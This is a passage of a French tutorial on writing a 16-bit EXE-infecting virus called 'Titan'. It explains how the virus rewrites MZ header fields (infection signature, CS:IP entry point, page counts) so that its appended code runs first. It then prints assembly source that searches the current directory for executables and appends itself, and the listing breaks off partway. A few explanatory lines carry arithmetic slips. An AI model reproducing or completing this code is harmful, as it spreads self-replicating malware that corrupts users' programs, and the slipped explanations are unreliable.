<p>Tout d'abord, il va falloir que lorsque on infecte un fichier, on ne le réinfecte pas 2 fois, pour cela on va mettre un signature dans l'header qui va nous permettre de vérifier si le fichier est déjà infecté ou pas. Pour cela, nous allons utilisé un champs de l'header qui est inutilisé, c'est à dire celui qui se trouve à l'offset 12h. Voici donc la ligne de code qui fait ceci:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">12h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">'T'</span><span style="color: #339933;">.</span></div>
<p>Nous savons aussi que à l'offset 10h de l'header se trouve le déplacement qu'il y a à partir de Ss pour atteindre Sp. On va donc mettre à cette adresse un valeur suffisemment grande qui nous assurerait que la pile ne débordera jamais sur le code (ce qui serai pas très bon), moi je mettrai la valeur 0fffeh mais sachez que vous pouvez à cette emplacement une autre valeur (mais qui devra être suffisemment grande). Cela se fait avec:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">10h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span>0FFFE<span style="color: #339933;">.</span></div>
<p>Voilà, nous avons fini avec 2 champs, il nous reste les autres à modifier. En plus ce sont eux les plus important car les offsets 14h et 16h sont capitals pour le bon fonctionnement du virus. En effet, nous voulons que quand le virus a infecté un fichier, ce soit le code du virus qui soit executer en premier et non le code du programme qui était exécuté en premier avant l'infection. Cette partie est donc très importante.</p>
<p>Tout d'abord, nous savons que les champs 14h et 16h de l'entete calcule le décalage à partir de la fin de l'header, il va donc falloir connaitre la taille de celle-ci. Nous avons de la chance, cette taille est donnée à l'offset 08h de l'header mais elle est donnée en paragraphes, il va donc falloir convertir en bytes ( 1 paragraphe = 16 bytes), il va donc falloir multiplier la taille de l'header en paragraphes par 16 par l'avoir en bytes. 16 étant un multiple de 2, on pourra utiliser l'instruction shl. Nous avons donc désormais la taille de l'header en bytes.</p>
<p>Juste avant d'appeler ce call, nous avons à l'aide de la fonction 42h de l'interruption 21h déplacer le pointeur de fichier vers la fin de celui ci. Or en retour de cette fonction, nous avons en dx et en ax, la taille du fichier où dx représente le mot de poids fort et en ax le mot de poids faible. Par exmple si le fichier fait 70000 bytes de taille, on aura dans dx : 1 et dans ax : 1170. Il va donc falloir que l'on s'occupe bien à la fois de ax et dx pour que il n'y est pas de problème. On va alors soustraire la taille de l'header à la taille du fichier avant infection; sachant que l'infecteur irra se greffer à la fin du fichier, on aura alors le déplacement qu'il y a de la fin de l'header au début de l'infecteur.</p>
<p>De plus, nous savons que la mémoire est organisé de telle manière que chaque adresse peut être représenté de la façon segment:offset et que on peut avoir la vrai adresse de quelquechose en faisant : segment * 16 + offset. Un vrai adresse peut donc être représenté de différentes façons. Revenons en à notre infecteur, sachant que l'on doit ranger à l'offset 16h le Cs initial du programme et à l'offset 14h le Ip initial, et tous deux étant calculés à partir de la fin de l'header. On en déduit que en divisant par 16 (10 en hexa) le déplacement qu'il y a de la fin de l'header au début de l'infecteur, on aura alors en ax le nouveau Cs et en dx le nouveau Ip. Aussi il faut savoir que les champs qui se trouvent à l'offset 0eh (Ss) et à l'offset 16h (Cs) doivent avoir la même valeur. Et voici le code:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">new_csip<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">8</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; taille de l'header en paragraphes</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cl</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0004h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">shl</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cl</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; bx = taille de l'header en bytes</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">bx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; ax = ax - taille de l'header</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sbb</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0000h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; soustraction avec retenue</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0010h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; on divise par 10h (16 en décimal)</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">div</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">0Eh</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; nouveau Ss</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">14h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">dx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; nouveau Ip</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">12h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">'T'</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; signature</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">16h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; nouveau Cs</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">10h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span>0FFFE &nbsp; &nbsp; &nbsp;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
&nbsp;</div>
<p>C'est fini pour cette partie de la programmation du virus. On est presque à la fin, il ne nous reste plus que le calcul des champs 02h et 04h de l'entête, ce qui n'est pas une partie insurmontable.</p>
<p>Nous avons vu déjà au début comment fonctionnait ces 2 champs, je vais refaire un exemple pour que vous compreniez bien. Metons un fichier qui 1200 bytes, alors on aura à l'offset 2 de l'header la taille de la dernière page, c'est à dire 176 et à l'offset 4, on aura le nombre de pages, ici on a 3.</p>
<pre class="source">
    1ere        2eme    3eme
***********|***********|****
 512 bytes   512 bytes   176 bytes
</pre>
<p>Voilà, ce shéma resume un peu ce qui se passe. Vous aurez peut etre compris comment on va faire pour recalculer le champs. En fait, on va s'aider bien entendu de la taille de notre virus que l'on pourra calculer à l'aide du label de début et du label de fin, pour nous ca donnerra: mov ax, fin - debut, ce qui mettra dans ax la taille de notre virus. Tout va commencé à partir de là, ensuite on divise ax par 512 (200 en hexadécimal), on aura donc à la suite de cette division en ax le nombre de page à ajouter à l'offset 4 de l'header et en dx le reste de la division à ajouter à l'offset 2 de l'entete. Or nous savons que à l'offset 2 de l'header se trouve la taille en bytes de la dernière page, donc il faut que ce nombre soit inférieur à la taille d'un page, c'est à dire 512 bytes,si c'est le cas, on a fini. En revanche si ce nombre est supérieur, il va falloir tout d'abord incréménter le nombre de pages que l'on trouve à l'offset 4 et en dernier truc il va falloir calculer le modulo[512] par rapport à ceux que on a en à l'offset 2 de l'header. Je vais faire avant un petit rappel sur les modulo et sur comment les calculer en assembleur.</p>
<p>Je vais vous mettre un exemple, je pense que ca suffira à comprendre:</p>
<p>600 modulo 512 est égale à 88.</p>
<p>1300 modulo 512 est égale à 276.</p>
<p>En fait, le modulo permet de calculer le reste de la division par 512 (dans ce cas). En assembleur, pour les puissances de 2, le modulo d'un nombre peut se cacluler par l'instruction and en choisissant comme deuxième opérande, le nombre qui est directement inférieur à 512 pour nous c'est à dire 511. Donc, nous on aura qu'à faire un petit:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">02</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span>512d<span style="color: #339933;">.</span></div>
<p>Je vais encore faire un exemple en utilisant un and pour trouver le modulo: On sait que par 13 modulo 4 est égale à 1. Maintenant représentons ces nombres en binaires</p>
<p>13 -> 00001101</p>
<p>Et vu que l'on veut calculer le modulo de 13 par rapport à 4, notre 2eme opérande sera donc 4-1, c'est à dire 3.</p>
<p>3 -> 00000011</p>
<p>Aussi avec un and les différentes combinaisons sont:</p>
<pre class="source">
0 and 0 = 0.
0 and 1 = 0.
1 and 0 = 0.
1 and 1 = 1.
</pre>
<p>Maintenant regardons cela de plus près.</p>
<pre class="source">
                       00001101
                   and 00000111
                   ------------
                       00000001        
</pre>
<p>On retrouve donc bien 1 en résultant, mais rappelez vous bien que cela ne fonctionne que lorsque l'on veut calculer le modulo de puissance de 2. Et le code:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">new_size<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">dx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> fin <span style="color: #339933;">-</span> debut &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; ax = taille du virus</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">200h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; 200h = 512d</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">div</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; divise ax par 512</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">04</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; ajoute le quotient de la division au nb de pages</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">02</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; ajoute le reste de la division &nbsp;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">02</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">200h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; compare dx avec 512</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jb</span>&nbsp; &nbsp; &nbsp; ttvabien&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; si inférieur on saute</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">02</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1FFh</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; on calcule le modulo (1ffh = 512d)</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: #339933;">+</span><span style="color: #ff0000;">04</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; on incrémente le nombre de pages </span><br/>
<br/>
ttvabien<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; on se casse</span><br/>
&nbsp;</div>
<p>Voilà, on en a finit avec l'explication de l'infecteur en entier. Et désormais le code source.</p>
<h2><a name="c3"></a>3. Code source</h2>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;Titan 1.0 par rikenar</span><br/>
<span style="color: black; font-style: italic;">;Titan est qqchose de si délicieux à fumer :-)).</span><br/>
<span style="color: black; font-style: italic;">;A pure titan</span><br/>
<span style="color: black; font-style: italic;">;Titan est un exe infecteur de fichier 16 bits fonctionnant sous windows qui a pour fonction d'</span><br/>
<span style="color: black; font-style: italic;">;infecter tous les fichiers du répertoire courant.</span><br/>
<br/>
<br/>
<span style="color: #339933;">.</span>model tiny<br/>
<span style="color: #339933;">.</span>radix <span style="color: #ff0000;">16</span><br/>
<span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">code</span><br/>
<br/>
org <span style="color: #ff0000;">100h</span><br/>
<br/>
debut<span style="color: #339933;">:</span> &nbsp;<br/>
<br/>
<span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">ds</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
<span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">cs</span> <span style="color: #46aa03; font-weight: bold;">cs</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
<span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span> <span style="color: #46aa03; font-weight: bold;">ds</span> &nbsp;<br/>
<br/>
<span style="color: #00007f; font-weight: bold;">call</span> delta<br/>
<br/>
delta<span style="color: #339933;">:</span><br/>
<span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">bp</span><br/>
<span style="color: #00007f; font-weight: bold;">sub</span> <span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">,</span> offset delta<br/>
<br/>
<br/>
ip<span style="color: #339933;">:</span><br/>
<span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span>ip_new <span style="color: #339933;">+</span> <span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: black;">&#93;</span><br/>
<span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span>ip_old <span style="color: #339933;">+</span> <span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">movsw</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">movsw</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">movsw</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">movsw</span><br/>
<br/>
mtda<span style="color: #339933;">:</span><br/>
<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1ah</span><br/>
<span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span> <span style="color: #339933;">+</span> offset new_dta<span style="color: black;">&#93;</span><br/>
<span style="color: #00007f; font-weight: bold;">int</span> <span style="color: #ff0000;">21h</span><br/>
<br/>
<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">4eh</span><br/>
<span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span> <span style="color: #339933;">+</span> exe_mask<span style="color: black;">&#93;</span><br/>
<span style="color: #00007f; font-weight: bold;">sub</span> <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cx</span><br/>
<br/>
<br/>
search<span style="color: #339933;">:</span><br/>
<span style="color: #00007f; font-weight: bold;">int</span> <span style="color: #ff0000;">21h</span><br/>
<span style="color: #00007f; font-weight: bold;">jc</span> end<br/>
<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">3dh</span><br/>
<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">02h</span><br/>
<span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>new_dta<span style="color: #339933;">+</span><span style="color: #ff0000;">1eh</span><span style="color: black;">&#93;</span><br/>
<span style="color: #00007f; font-weight: bold;">int</span> <span style="color: #ff0000;">21h</span><br/>
<br/>
<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span><br/>
<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">5700h</span><br/>
<span style="color: #00007f; font-weight: bold;">int</span> <span style="color: #ff0000;">21h</span><br/>
<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">cx</span><br/>
<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">dx</span> <br/>
<br/>
<br/>
<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">bx</span><br/>
<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">3fh</span><br/>
<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1ah</span><br/>
<span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span> <span style="color: #339933;">+</span> offset buffer_header<span style="color: black;">&#93;</span><br/>
<span style="color: #00007f; font-weight: bold;">int</span> <span style="color: #ff0000;">21h</span><br/>
<br/>
<br/>
<span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">'ZM'</span><br/>
<span style="color: #00007f; font-weight: bold;">jne</span> close<br/>
<br/>
<span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>buffer_header <span style="color: #339933;">+</span> <span style="color: #ff0000;">12</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">'T'</span><br/>
<span style="color: #00007f; font-weight: bold;">je</span> close<br/>
<br/>
<span style="color: #00007f; font-weight: bold;">call</span> save_header<br/>
<br/>
<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">42h</span><br/>
<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">02h</span><br/>
<span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cx</span><br/>
<span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">dx</span><br/>
<span style="color: #00007f; font-weight: bold;">int</span> <span style="color: #ff0000;">21h</span><br/>
<br/>
<span style="color: #00007f; font-weight: bold;">call</span> new_csip<br/>
<span style="color: #00007f; font-weight: bold;">call</span> new_size<br/>
<br/>
<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">40h</span><br/>
<span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">bx</span><br/>
<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> fin <span style="color: #339933;">-</span> debut<br/>
<span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span> <span style="color: #339933;">+</span> debut<span style="color: black;">&#93;</span><br/>
<span style="color: #00007f; font-weight: bold;">int</span> <span style="color: #ff0000;">21h</span><br/>
<br/>
